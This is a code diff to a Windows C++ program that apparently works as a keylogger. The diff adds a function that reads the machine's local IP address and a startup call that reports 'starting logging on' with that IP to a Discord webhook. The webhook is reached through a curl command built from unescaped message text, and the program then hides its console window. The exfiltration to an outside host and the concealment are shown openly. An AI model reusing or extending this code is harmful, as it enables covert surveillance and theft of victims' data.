@@ -1,7 +1,11 @@
 #define _WIN32_WINNT 0x0500
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <Windows.h>
 #include <string>
 #include <iostream>
+
+#pragma comment(lib, "ws2_32.lib")
 
 using namespace std;
 
@@ -61,12 +65,32 @@ void sendToDiscord(const std::string& message) {
 	//||||||||||||||||||||||||||||||||
 
 
+	
     std::string command = "curl -H \"Content-Type: application/json\" -X POST -d \"{\\\"content\\\": \\\"" + message + "\\\"}\" \"" + webhookUrl + "\"";
     system(command.c_str());
+}
+string getLocalIP() {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+
+    struct hostent* host = gethostbyname(hostname);
+    if (host == nullptr) {
+        return "Unable to get IP";
+    }
+
+    struct in_addr* addr = (struct in_addr*)host->h_addr_list[0];
+    string ip = inet_ntoa(*addr);
+
+    WSACleanup();
+    return ip;
 }
 
 int main()
 {
+	sendToDiscord("starting logging on: "+getLocalIP());	
 	ShowWindow(GetConsoleWindow(), SW_HIDE); // Optional: hide console window
     string buffer;
 
